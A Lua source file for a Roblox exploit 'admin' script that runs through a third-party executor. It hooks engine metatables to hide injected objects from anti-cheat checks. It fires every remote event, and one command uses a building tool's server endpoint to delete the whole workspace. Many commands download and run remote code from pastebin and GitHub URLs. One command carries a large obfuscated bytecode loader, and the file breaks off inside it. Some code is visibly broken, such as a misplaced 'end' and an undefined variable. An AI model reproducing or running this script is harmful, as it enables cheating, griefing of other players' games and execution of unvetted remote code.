local opt = {
	prefix = ';',			-- ;ff me | /ff me
	tupleSeparator = ',',	-- ;ff me,others,all | ;ff me/others/all
	ui = {					-- never did anything with this
		
	},
	keybinds = {			-- never did anything with this
		
	},
}

--[[ VARIABLES ]]--
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")

local localPlayer = Players.LocalPlayer
local character = localPlayer.Character
local mouse = localPlayer:GetMouse()
local camera = workspace.CurrentCamera
local camtype = camera.CameraType
local Commands, Aliases = {}, {}
player, plr, lp = localPlayer, localPlayer, localPlayer, localPlayer

localPlayer.CharacterAdded:Connect(function(c)
	character = c
end)

--[[ COMMAND FUNCTIONS ]]--
cmd = {}
cmd.add = function(...)
	local vars = {...}
	local aliases, info, func = vars[1], vars[2], vars[3]
	for i, cmdName in pairs(aliases) do
		if i == 1 then
			Commands[cmdName:lower()] = {func, info}
		else
			Aliases[cmdName:lower()] = {func, info}
		end
	end
end

cmd.run = function(args)
	local caller, arguments = args[1], args; table.remove(args, 1);
	local success, msg = pcall(function()
		if Commands[caller:lower()] then
			Commands[caller:lower()][1](unpack(arguments))
		elseif Aliases[caller:lower()] then
			Aliases[caller:lower()][1](unpack(arguments))
		end
	end)
	if not success then
		lib.messageOut("Admin error", msg)
	end
end

--[[ LIBRARY FUNCTIONS ]]--
lib = {}
lib.wrap = function(f)
	return coroutine.wrap(f)()
end
wrap = lib.wrap

lib.messageOut = function(title, msg)
	StarterGui:SetCore("SendNotification", 
		{
			Title = title,
			Text = msg
		}
	)
end

local wait = function(int)
	if not int then int = 0 end
	local t = tick()
	repeat
		RunService.Heartbeat:Wait(0)
	until (tick() - t) >= int
	return (tick() - t), t
end
spawn(function()
	lib.messageOut("Admin successfully loaded", "Have fun!")
end)

lib.lock = function(instance, par)
	locks[instance] = true
	instance.Parent = par or instance.Parent
	instance.Name = "RightGrip"
end
lock = lib.lock
locks = {}
if hookfunction then	-- i believe this was for hiding stuff like bodyvelocity
	local pseudo = Instance.new("Motor6D")
	_1 = hookfunction(pseudo.IsA, function(...)
		local p, ret = ({...})[1], _1(...)
		if checkcaller() then return ret end
		if locks[p] then
			return false
		end
		return ret
	end)
	_2 = hookfunction(pseudo.FindFirstChildWhichIsA, function(...)
		local p = _2(...)
		if checkcaller() then return p end
		if locks[p] then
			return nil
		end
		return p
	end)
	_3 = hookfunction(pseudo.FindFirstChildOfClass, function(...)
		local p = _3(...)
		if checkcaller() then return p end
		if locks[p] then
			return nil
		end
		return p
	end)
	_4 = hookfunction(pseudo.Destroy, function(...)
		local args = {...}
		if checkcaller() then return _4(...) end
		if locks[args[1]] then return end
		return
	end)
	
	local mt = getrawmetatable(game)
	local _ni = mt.__newindex
	local _nc = mt.__namecall
	local _i = mt.__index
	setreadonly(mt, false)
	
	mt.__index = newcclosure(function(t, i)
		if locks[t] and not checkcaller() then
			return _i(pseudo, i)
		end
		return _i(t, i)
	end)
	mt.__newindex = newcclosure(function(t, i, v)
		if locks[t] and not checkcaller() then
			return _ni(pseudo, i, v)
		end
		return _ni(t, i, v)
	end)
	mt.__namecall = newcclosure(function(t, ...)
		if locks[t] and not checkcaller() then
			return _nc(pseudo, ...)
		end
		return _nc(t, ...)
	end)
end

lib.find = function(t, v)	-- mmmmmm
	for i, e in pairs(t) do
		if i == v or e == v then
			return i
		end
	end
	return nil
end

lib.parseText = function(text, watch)
	local parsed = {}
	if not text then return nil end
	for arg in text:gmatch("[^" .. watch .. "]+") do
		arg = arg:gsub("-", "%%-")
		local pos = text:find(arg)
		arg = arg:gsub("%%", "")
		if pos then
			local find = text:sub(pos - opt.prefix:len(), pos - 1)
			if (find == opt.prefix and watch == opt.prefix) or watch ~= opt.prefix then
				table.insert(parsed, arg)
			end
		else
			table.insert(parsed, nil)
		end
	end
	return parsed
end

lib.parseCommand = function(text)
	wrap(function()
		local commands = lib.parseText(text, opt.prefix)
		for _, parsed in pairs(commands) do
			local args = {}
			for arg in parsed:gmatch("[^ ]+") do
				table.insert(args, arg)
			end
			cmd.run(args)
		end
	end)
end

local connections = {}

lib.connect = function(name, connection)	-- no :(
	connections[name .. tostring(math.random(1000000, 9999999))] = connection
	return connection
end

lib.disconnect = function(name)
	for title, connection in pairs(connections) do
		if title:find(name) == 1 then
			connection:Disconnect()
		end
	end
end

m = math
rad = m.rad
clamp = m.clamp
sin = m.sin
tan = m.tan
cos = m.cos

--[[ PLAYER FUNCTIONS ]]--
argument = {}
argument.getPlayers = function(str)
	local playerNames, players = lib.parseText(str, opt.tupleSeparator), {}
	for _, arg in pairs(playerNames or {"me"}) do
		arg = arg:lower()
		local playerList = Players:GetPlayers()
		if arg == "me" or arg == nil then
			table.insert(players, localPlayer)
			
		elseif arg == "all" then
			for _, plr in pairs(playerList) do
				table.insert(players, plr)
			end
			
		elseif arg == "others" then
			for _, plr in pairs(playerList) do
				if plr ~= localPlayer then
					table.insert(players, plr)
				end
			end
			
		elseif arg == "random" then
			table.insert(players, playerList[math.random(1, #playerList)])
			
		elseif arg:find("%%") == 1 then
			local teamName = arg:sub(2)
			for _, plr in pairs(playerList) do
				if tostring(plr.Team):lower():find(teamName) == 1 then
					table.insert(players, plr)
				end
			end
			
		else
			for _, plr in pairs(playerList) do
				if plr.Name:lower():find(arg) == 1 then
					table.insert(players, plr)
				end
			end
		end
	end
	return players
end

--[[ COMMANDS ]]--

--[ SCRIPT ]--
cmd.add({"script", "ls", "s", "run"}, {"script <source>", "Run the code requested"}, function(source)
	loadstring(source)()
end)

cmd.add({"httpget", "hl", "get"}, {"httpget <url>", "Run the contents of a given URL"}, function(url)
	loadstring(game:HttpGet(url, true))()
end)

--[ UTILITY ]--
cmd.add({"devconsole", "developerconsole", "console"}, {"devconsole", "Open the old developer console"}, function()
	StarterGui:SetCore("DeveloperConsoleVisible", true)
end)

cmd.add({"chatlogs", "clogs"}, {"chatlogs", "Open the chat logs"}, function()
	gui.chatlogs()
end)

cmd.add({"commands", "cmds"}, {"commands", "Open the command list"}, function()
	gui.commands()
end)

cmd.add({"print", "p"}, {"print <tuple>", "Print the given arguments"}, function(...)
	print(...)
end)

cmd.add({"warn", "w"}, {"warn <tuple>", "Warn the given arguments"}, function(...)
	warn(...)
end)

cmd.add({"rejoin", "rj"}, {"rejoin", "Rejoin the game"}, function()
	game:GetService("TeleportService"):Teleport(game.PlaceId)
end)

cmd.add({"place", "game", "join"}, {"place <placeId> [player]", "Join a place with the given PlaceId or a player's server"}, function(placeid, playerName)
	game:GetService("TeleportService"):Teleport(placeid, playerName)
end)

cmd.add({"disconnectevents", "disableevents"}, {"disconnectevents <instance> <event>", "Disable the given instance's connections to the event"}, function(objDir, event)
	local obj = loadstring("return " .. objDir)()
	local events = getconnections(obj[event])
	for _, connection in pairs(events) do
		connection:Disable()
	end
end)

cmd.add({"grabtools", "gt"}, {"grabtools", "Grabs any dropped tools"}, function()
	for i, v in pairs(workspace.Tools:GetChildren()) do
        v.LidToggle:FireServer()
    end
end)

cmd.add({"fireclickdetectors", "fcd"}, {"fireclickdetectors", "Fires every click detector that's in workspace"}, function()
	for i,v in pairs(game:GetDescendants()) do
        if v:IsA("ClickDetector") then
            fireclickdetector(v)
        end
    end
end)

cmd.add({"firetouchinterests", "fti"}, {"firetouchinterests", "Fires every Touch Interest that's in workspace"}, function()
	for _,v in pairs(workspace:GetDescendants()) do
        if v:IsA("TouchTransmitter") then
        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 0) --0 is touch
        wait()
        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 1) -- 1 is untouch
        end
        end
end)

cmd.add({"fireproximityprompts", "fpp"}, {"fireproximityprompts", "Fires every Touch Interest that's in workspace"}, function()
	fireproximityprompt(workspace.Instance.ProximityPrompt, 1, true)
end)

cmd.add({"fireremotes"}, {"fireremotes", "Fires every remote."}, function()
	for i,v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            v:FireServer()
        end
        if v:IsA("BindableEvent") then
            v:Fire()
        if v:IsA("RemoteFunction") then
            v:InvokeServer()
        end
    end
end)


cmd.add({"unanchoredfollow"}, {"unanchoredfollow", "Makes unanchored parts follow you"}, function()
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local unanchoredparts = {}
    local movers = {}
    for index, part in pairs(workspace:GetDescendants()) do
        if part:IsA("Part") and part.Anchored == false and part:IsDescendantOf(LocalPlayer.Character) == false then
            table.insert(unanchoredparts, part)
            part.Massless = true
            part.CanCollide = false
            if part:FindFirstChildOfClass("BodyPosition") ~= nil then
                part:FindFirstChildOfClass("BodyPosition"):Destroy()
            end
        end
    end
    for index, part in pairs(unanchoredparts) do
        local mover = Instance.new("BodyPosition", part)
        table.insert(movers, mover)
        mover.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    end
    repeat
        for index, mover in pairs(movers) do
            mover.Position = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame:PointToWorldSpace(Vector3.new(0, 0, 5))
        end
        wait(0.5)
    until LocalPlayer.Character:FindFirstChild("Humanoid").Health <= 0
    for _, mover in pairs(movers) do
        mover:Destroy()
    end
end)

cmd.add({"fov"}, {"fov <number>", "Makes your FOV to something custom you want (1-120 FOV)"}, function(...)
    workspace.CurrentCamera.FieldOfView = (...)
end)

cmd.add({"networkown"}, {"networkown", "makes network ownership to unanchored parts yours"}, function(part)
	spawn(function()
		while true do
			game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)*math.huge
			game.Players.LocalPlayer.SimulationRadius = math.pow(math.huge,math.huge)*math.huge
			game:GetService("RunService").Stepped:wait()
		end
	 end)
end)

cmd.add({"homebrew"}, {"homebrew", "Executes homebrew admin"}, function()
    _G.CustomUI = false
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
end)

cmd.add({"fatesadmin"}, {"fatesadmin", "Executes fates admin"}, function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
end)

cmd.add({"krystaldance"}, {"krystaldance", "Krystal Dance"}, function()
    loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/e51327540d1ba5ede244c459dbdb5a0e/raw/6320fe344ac51a311ef7c9f8d5c3924b1a7c3969/Krystal%2520Dance'))()
    end)

cmd.add({"toolui"}, {"toolui", "cool tool ui aka replication ui made by 0866"}, function()
    loadstring(game:HttpGet("https://pastebin.com/raw/vr2YVyF6"))();
end)

cmd.add({"size"}, {"size", "makes you a big boy (r15 only)"}, function()
    if Player.Character:FindFirstChild("UpperTorso") then
        loadstring(game:HttpGet("https://pastebin.com/raw/mVpRNwa1"))();
    end
end)

cmd.add({"ws"}, {"ws <number>", "Makes your WalkSpeed whatever you want"}, function(...)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (...)
end)

cmd.add({"jp"}, {"jp <number>", "Makes your JumpPower whatever you want"}, function(...)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = (...)
end)

cmd.add({"oofspam"}, {"oofspam", "Spams oof"}, function()
	_G.enabled = true
    _G.speed = 110

    local RunService = game:GetService("RunService");
    local Players = game:GetService("Players");
    local LocalPlayer = game:GetService("Players").LocalPlayer;
    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait();
    local Humanoid = Character:WaitForChild("Humanoid") or Character:FindFirstChildOfClass("Humanoid");
    local HRP = Humanoid.RootPart or Humanoid:FindFirstChild("HumanoidRootPart")
    
    if not Humanoid or not _G.enabled then
        if Humanoid and Humanoid.Health <= 0 then
            Humanoid:Destroy()
        end
        return
    end
 
    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
    Humanoid.BreakJointsOnDeath = false
    Humanoid.RequiresNeck = false
 
    local con; con = RunService.Stepped:Connect(function()
    if not Humanoid then return con:Disconnect() end
    Humanoid:ChangeState(Enum.HumanoidStateType.Running)
    end)
 
    LocalPlayer.Character = nil
    LocalPlayer.Character = Character
    task.wait(Players.RespawnTime + 0.1)

    while task.wait(1/_G.speed) do
        Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
    end
end)

cmd.add({"harked"}, {"harked", "Harked Reborn"}, function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/qipurblx/Scripts/main/harked"))();
end)

cmd.add({"dex"}, {"dex", "Lazy Dex"}, function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/Lazy_Dex.lua"))()
end)

cmd.add({"antifling"}, {"antifling", "makes you not get flinged by exploiters"}, function()
    local Services = setmetatable({}, {__index = function(Self, Index)
        local NewService = game.GetService(game, Index)
        if NewService then
            Self[Index] = NewService
        end
        return NewService
	end})

	local LocalPlayer = Services.Players.LocalPlayer
	
	local function PlayerAdded(Player)
	   local Detected = false
	   local Character;
	   local PrimaryPart;
	
	   local function CharacterAdded(NewCharacter)
		   Character = NewCharacter
            repeat
                wait()
                PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
            until PrimaryPart
		   Detected = false
	   end
	
	   CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
	   Player.CharacterAdded:Connect(CharacterAdded)
	   Services.RunService.Heartbeat:Connect(function()
		   if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
			   if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
				   if Detected == false then
					   game.StarterGui:SetCore("ChatMakeSystemMessage", {
						   Text = "Fling Exploit detected, Player: " .. tostring(Player);
						   Color = Color3.fromRGB(255, 200, 0);
					   })
				   end
				   Detected = true
				   for i,v in ipairs(Character:GetDescendants()) do
					   if v:IsA("BasePart") then
						   v.CanCollide = false
						   v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
						   v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
						   v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
					   end
				   end
				   PrimaryPart.CanCollide = false
				   PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
				   PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
				   PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
			   end
		   end
	   end)
	end
	
	for i,v in ipairs(Services.Players:GetPlayers()) do
	   if v ~= LocalPlayer then
		   PlayerAdded(v)
	   end
	end
	Services.Players.PlayerAdded:Connect(PlayerAdded)
	
	local LastPosition = nil
	Services.RunService.Heartbeat:Connect(function()
	   pcall(function()
		   local PrimaryPart = LocalPlayer.Character.PrimaryPart
		   if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
			   PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
			   PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
			   PrimaryPart.CFrame = LastPosition
	
			   game.StarterGui:SetCore("ChatMakeSystemMessage", {
				   Text = "You were flung. Neutralizing velocity.";
				   Color = Color3.fromRGB(255, 0, 0);
			   })
		   elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
			   LastPosition = PrimaryPart.CFrame
		   end
	   end)
	end)
end)

cmd.add({"table"}, {"table", "Turns you into a table"}, function()
				loadstring(game:HttpGet(('https://pastebin.com/raw/UmdYd4bE'),true))()
				local plr = game.Players.LocalPlayer
				game:GetService("RunService").Stepped:Connect(function()
				   setsimulationradius(9e9,9e9)
				   plr.ReplicationFocus = workspace
				   settings().Physics.AllowSleep = false
				end)
				local runservice=game:service"RunService";
				local player=game:service"Players"["LocalPlayer"];
				local character=player["Character"];
				character["Head"]:FindFirstChildOfClass"SpecialMesh":Destroy();
				
				character["Humanoid"].HipHeight=-2;
				character["Left Leg"]:BreakJoints();
				character["Right Leg"]:BreakJoints();
				character["Left Arm"]:BreakJoints();
				character["Right Arm"]:BreakJoints();
				while runservice["Heartbeat"]:Wait() do
					character["Left Leg"].CFrame=character["HumanoidRootPart"].CFrame*CFrame.new(-0.5,1.5,1.5) * CFrame.Angles(math.rad(90), 0, 0);
					character["Right Leg"].CFrame=character["HumanoidRootPart"].CFrame*CFrame.new(0.5,1.5,1.5) * CFrame.Angles(math.rad(90), 0, 0);
					character["Left Arm"].CFrame=character["HumanoidRootPart"].CFrame*CFrame.new(-0.5,0,2);
					character["Right Arm"].CFrame=character["HumanoidRootPart"].CFrame*CFrame.new(0.5,0,2);
				end			end)

cmd.add({"f3xdeleteall"}, {"f3xdeleteall", "Deletes everything if you have F3X"}, function()
    if not game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Building Tools") then return end
    for i,v in pairs(game.Workspace:GetChildren()) do 
        local args = {
            [1] = "Remove",
            [2] = {
                [1] = v
            }
        }
        
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
    end
end)

cmd.add({"gravitygun"}, {"gravitygun", "Probably the best gravity gun script thats fe"}, function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/qipurblx/Script/main/Gravity%20Gun"))()
end)

cmd.add({"controlnpcs"}, {"controlnpcs", "Controls walking NPCS"}, function()
local mouse = game.Players.LocalPlayer:GetMouse()
local uis = game:GetService("UserInputService")

mouse.Button1Down:Connect(function()
    if mouse.Target and uis:IsKeyDown(Enum.KeyCode.LeftControl) then
        local npc = mouse.target.Parent
        local npcRootPart = npc.HumanoidRootPart
        local PlayerCharacter = game:GetService("Players").LocalPlayer.Character
        local PlayerRootPart = PlayerCharacter.HumanoidRootPart
        local A0 = Instance.new("Attachment")
        local AP = Instance.new("AlignPosition")
        local AO = Instance.new("AlignOrientation")
        local A1 = Instance.new("Attachment")
        for _, v in pairs(npc:GetDescendants()) do
            if v:IsA("BasePart") then
                game:GetService("RunService").Stepped:Connect(function()
                    v.CanCollide = false
                end)
            end
        end
        PlayerRootPart:BreakJoints()
        for _, v in pairs(PlayerCharacter:GetDescendants()) do
            if v:IsA("BasePart") then
                if v.Name == "HumanoidRootPart" or v.Name == "UpperTorso" or v.Name == "Head" then
                    print(".")
                else
                    v:Destroy()
                end
            end
        end

        PlayerRootPart.Position = PlayerRootPart.Position+Vector3.new(5, 0, 0)
        PlayerCharacter.Head.Anchored = true
        PlayerCharacter.UpperTorso.Anchored = true
        A0.Parent = npcRootPart
        AP.Parent = npcRootPart
        AO.Parent = npcRootPart
        AP.Responsiveness = 200
        AP.MaxForce = math.huge
        AO.MaxTorque = math.huge
        AO.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        AO.Attachment1 = A1
        AO.Attachment0 = A0
        A1.Parent = PlayerRootPart
    end)
end)

cmd.add({"Netless", "Net"}, {"Netless", "Executes netless which makes scripts more stable"}, function()
    for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
        if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then 
            game:GetService("RunService").Heartbeat:connect(function()
                v.Velocity = Vector3.new(-30,0,0)
            end)
        end
    end
 
    print("Success:", "Netless has been ran.")
end)

cmd.add({"FEBtools", "FEB"}, {"FEBtools", "Executes an FE Btools Script parts are by your hats"}, function()
    local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=getfenv or function()return _ENV;end;local v9=setmetatable;local v10=pcall;local v11=select;local v12=unpack or table.unpack;local v13=tonumber;local function v14(v15,v16)local v17=1;local v18;v15=v4(v3(v15,5),"..",function(v29)if (v1(v29,2)==79) then v18=v0(v3(v29,1,1));return "";else local v70=v2(v0(v29,16));if v18 then local v82=v5(v70,v18);v18=nil;return v82;else return v70;end end end);local function v19(v30,v31,v32)if v32 then local v71=(v30/(2^(v31-1)))%(2^(((v32-1) -(v31-1)) + 1));return v71-(v71%1);else local v72=2^(v31-1);return (((v30%(v72 + v72))>=v72) and 1) or 0;end end local function v20()local v37=v1(v15,v17,v17);v17=v17 + 1;return v37;end local function v21()local v38,v39=v1(v15,v17,v17 + 2);v17=v17 + 2;return (v39 * 256) + v38;end local function v22()local v40,v41,v42,v43=v1(v15,v17,v17 + 3);v17=v17 + 4;return (v43 * 16777216) + (v42 * 65536) + (v41 * 256) + v40;end local function v23()local v44=v22();local v45=v22();return (( -2 * v19(v45,32)) + 1) * (2^(v19(v45,21,31) -1023)) * ((((v19(v45,1,20) * (2^32)) + v44)/(2^52)) + 1);end local function v24(v33)local v46;if  not v33 then v33=v22();if (v33==0) then return "";end end v46=v3(v15,v17,(v17 + v33) -1);v17=v17 + v33;local v47={};for v58=1, #v46 do v47[v58]=v2(v1(v3(v46,v58,v58)));end return v6(v47);end local v25=v22;local function v26(...)return {...},v11("#",...);end local function v27()local v48={};local v49={};local v50={};local v51={v48,v49,nil,v50};local v52=v22();local v53={};for v60=1,v52 do local v61=v20();local v62;if (v61==1) then v62=v20()~=0;elseif (v61==2) then v62=v23();elseif (v61==3) then v62=v24();end v53[v60]=v62;end v51[3]=v20();for v64=1,v22() do local v65=v20();if (v19(v65,1,1)==0) then local v78=v19(v65,2,3);local v79=v19(v65,4,6);local v80={v21(),v21(),nil,nil};if (v78==0) then v80[3]=v21();v80[4]=v21();elseif (v78==1) then v80[3]=v22();elseif (v78==2) then v80[3]=v22() -(2^16);elseif (v78==3) then v80[3]=v22() -(2^16);v80[4]=v21();end if (v19(v79,1,1)==1) then v80[2]=v53[v80[2]];end if (v19(v79,2,2)==1) then v80[3]=v53[v80[3]];end if (v19(v79,3,3)==1) then v80[4]=v53[v80[4]];end v48[v64]=v80;end end for v66=1,v22() do v49[v66-1]=v27();end for v68=1,v22() do v50[v68]=v22();end return v51;end local function v28(v34,v35,v36)local v55=v34[1];local v56=v34[2];local v57=v34[3];return function(...)local v73=1;local v74= -1;local v75={...};local v76=v11("#",...) -1;local function v77()local v83=v55;local v84=Const;local v85=v56;local v86=v57;local v87=v26;local v88={};local v89={};local v90={};for v100=0,v76 do if (v100>=v86) then v88[v100-v86]=v75[v100 + 1];else v90[v100]=v75[v100 + 1];end end local v91=(v76-v86) + 1;local v92;local v93;while true do v92=v83[v73];v93=v92[1];if (v93<=19) then if (v93<=9) then if (v93<=4) then if (v93<=1) then if (v93>0) then local v107=v92[2];v90[v107](v12(v90,v107 + 1,v92[3]));else local v108=v92[2];local v109={v90[v108](v12(v90,v108 + 1,v74))};local v110=0;for v139=v108,v92[4] do v110=v110 + 1;v90[v139]=v109[v110];end end elseif (v93<=2) then for v141=v92[2],v92[3] do v90[v141]=nil;end elseif (v93>3) then local v149=v85[v92[3]];local v150;local v151={};v150=v9({},{__index=function(v178,v179)local v191=v151[v179];return v191[1][v191[2]];end,__newindex=function(v180,v181,v182)local v192=v151[v181];v192[1][v192[2]]=v182;end});for v183=1,v92[4] do v73=v73 + 1;local v184=v83[v73];if (v184[1]==22) then v151[v183-1]={v90,v184[3]};else v151[v183-1]={v35,v184[3]};end v89[ #v89 + 1]=v151;end v90[v92[2]]=v28(v149,v150,v36);else v36[v92[3]]=v90[v92[2]];end elseif (v93<=6) then if (v93==5) then local v111=v92[2];local v112={v90[v111](v90[v111 + 1])};local v113=0;for v143=v111,v92[4] do v113=v113 + 1;v90[v143]=v112[v113];end elseif v90[v92[2]] then v73=v73 + 1;else v73=v92[3];end elseif (v93<=7) then v90[v92[2]]=v90[v92[3]] + v90[v92[4]];elseif (v93>8) then if (v90[v92[2]]~=v92[4]) then v73=v73 + 1;else v73=v92[3];end else local v154=v92[2];v90[v154](v90[v154 + 1]);end elseif (v93<=14) then if (v93<=11) then if (v93>10) then v73=v92[3];else do return;end end elseif (v93<=12) then local v115=v92[2];local v116=v92[4];local v117=v115 + 2;local v118={v90[v115](v90[v115 + 1],v90[v117])};for v145=1,v116 do v90[v117 + v145]=v118[v145];end local v119=v118[1];if v119 then v90[v117]=v119;v73=v92[3];else v73=v73 + 1;end elseif (v93==13) then v90[v92[2]][v92[3]]=v90[v92[4]];else v90[v92[2]]=v90[v92[3]] -v90[v92[4]];end elseif (v93<=16) then if (v93>15) then v90[v92[2]]();else local v120=v92[2];v90[v120]=v90[v120](v12(v90,v120 + 1,v92[3]));end elseif (v93<=17) then local v122=v92[2];v90[v122](v12(v90,v122 + 1,v74));elseif (v93>18) then local v158=v92[2];v90[v158]=v90[v158](v90[v158 + 1]);else local v160=v92[2];v90[v160]=v90[v160]();end elseif (v93<=29) then if (v93<=24) then if (v93<=21) then if (v93==20) then v90[v92[2]]=v90[v92[3]][v90[v92[4]]];elseif (v90[v92[2]]==v90[v92[4]]) then v73=v73 + 1;else v73=v92[3];end elseif (v93<=22) then v90[v92[2]]=v90[v92[3]];elseif (v93==23) then v90[v92[2]]=v92[3];else local v163=v92[2];local v164={};for v186=1, #v89 do local v187=v89[v186];for v194=0, #v187 do local v195=v187[v194];local v196=v195[1];local v197=v195[2];if ((v196==v90) and (v197>=v163)) then v164[v197]=v196[v197];v195[1]=v164;end end end end elseif (v93<=26) then if (v93>25) then v90[v92[2]]=v28(v85[v92[3]],nil,v36);else local v126=v92[2];local v127,v128=v87(v90[v126](v90[v126 + 1]));v74=(v128 + v126) -1;local v129=0;for v147=v126,v74 do v129=v129 + 1;v90[v147]=v127[v129];end end elseif (v93<=27) then v90[v92[2]][v92[3]]=v92[4];elseif (v93>28) then v90[v92[2]]=v90[v92[3]] -v92[4];else v90[v92[2]]=v36[v92[3]];end elseif (v93<=34) then if (v93<=31) then if (v93>30) then v90[v92[2]]=v90[v92[3]] * v90[v92[4]];else v90[v92[2]]=v90[v92[3]] + v92[4];end elseif (v93<=32) then local v133=v92[2];local v134=v90[v92[3]];v90[v133 + 1]=v134;v90[v133]=v134[v92[4]];elseif (v93==33) then v90[v92[2]]=v92[3]~=0;else local v168=v92[2];local v169,v170=v87(v90[v168](v12(v90,v168 + 1,v92[3])));v74=(v170 + v168) -1;local v171=0;for v188=v168,v74 do v171=v171 + 1;v90[v188]=v169[v171];end end elseif (v93<=37) then if (v93<=35) then v90[v92[2]]=v90[v92[3]][v92[4]];elseif (v93==36) then local v172=v92[3];local v173=v90[v172];for v190=v172 + 1,v92[4] do v173=v173   .. v90[v190];end v90[v92[2]]=v173;else local v175=v92[2];v90[v175]=v90[v175](v12(v90,v175 + 1,v74));end elseif (v93<=38) then v90[v92[2]]=v35[v92[3]];elseif (v93>39) then v90[v92[2]]={};elseif (v90[v92[2]]==v92[4]) then v73=v73 + 1;else v73=v92[3];end v73=v73 + 1;end end A,B=v26(v10(v77));if  not A[1] then local v94=v34[4][v73] or "?";error("Script error at ["   .. v94   .. "]:"   .. A[2]);else return v12(A,2,B);end end;end return v28(v27(),{},v16)();end v14("LOL!B53O0003083O00746F737472696E6703043O006D61746803063O0072616E646F6D024O0084D79741022O0080FF642OCD4103083O00496E7374616E63652O033O006E657703093O005363722O656E47756903043O004E616D6503053O004672616D65030A3O00496D6167654C6162656C03093O00546578744C6162656C030A3O005465787442752O746F6E03063O00506172656E7403043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C61796572030C3O0057616974466F724368696C6403093O00506C61796572477569030E3O005A496E6465784265686176696F7203043O00456E756D03073O005369626C696E6703103O004261636B67726F756E64436F6C6F723303063O00436F6C6F723303073O0066726F6D524742025O00E06F40028O0003163O004261636B67726F756E645472616E73706172656E6379026O00F03F03083O00506F736974696F6E03053O005544696D3202DC9E97BF7F89D53F0271DCE5FFAE7FCE3F03043O0053697A65025O00C07B40025O00707A4003053O00496D61676503293O00682O74703A2O2F3O772E726F626C6F782E636F6D2F612O7365742F3F69643D393637383733382O3702CC6C2F20B6DFB13F029EFECE5FF127B23F025O00806640025O0080424003043O00466F6E74030A3O00536F7572636553616E7303043O005465787403313O004D6164652062793A2028312B313D32206F6E20726F626C6F78292C2028726F75786861766572206F6E2067697468756229030A3O0054657874436F6C6F7233030A3O00546578745363616C65642O0103083O005465787453697A65026O002C40030B3O00546578745772612O706564029E973EFF3346C43F030D3O00496E737472756374696F6E733A02FD493060BFA3B73F02920645609DA4D03F025O00307740026O002O4003123O00286F6E6C7920776F726B7320696E20523629026O003940030E3O005465787458416C69676E6D656E7403043O004C656674030E3O005465787459416C69676E6D656E742O033O00546F70020EA7D63FAB93D43F03223O00312E20457175697020226D6F76652220742O6F6C20746F206D6F766520686174732E022C6F19004235D83F025O00804A4003333O00322E205072652O7320746865205120616E642045206B65797320746F206D6F7665204861747320757020616E6420646F776E2E02473F24C00C1DE03F03293O00332E205072652O73205220616E642054206B65797320746F20726F7461746520616E642074696C742E02238B2C80C688E23F032C3O00342E2045717569702022636F2O6C6964652220742O6F6C20746F20746F2O676C6520636F2O6C6973696F6E2E0200D7344080F4E43F025O00405C4003423O00352E205768656E2066692O6E69736865642077697468204275696C642C205072652O73207468652042206B657920746F20616E63686F72652074686520486174732E03013O0032030C3O00426F72646572436F6C6F7233025O00406540030F3O00426F7264657253697A65506978656C026O000840026O66EA3F029A5O99B93F025O00802O4003013O005803113O004D6F75736542752O746F6E31436C69636B03073O00636F2O6E65637403043O00742O6F6C03043O00542O6F6C03093O0043686172616374657203043O004D6F766503063O00736D2O6F746803063O00426C6F636B7903053O00742O6F6C3303083O004261636B7061636B030A3O004D6F76656D656E74205B03013O005D030A3O0063616E636F2O6C69646503053O00742O6F6C32030B3O00436F2O6C6973696F6E205B2O033O00657175030A3O0047657453657276696365030A3O0052756E5365727669636503093O0048656172746265617403073O00436F2O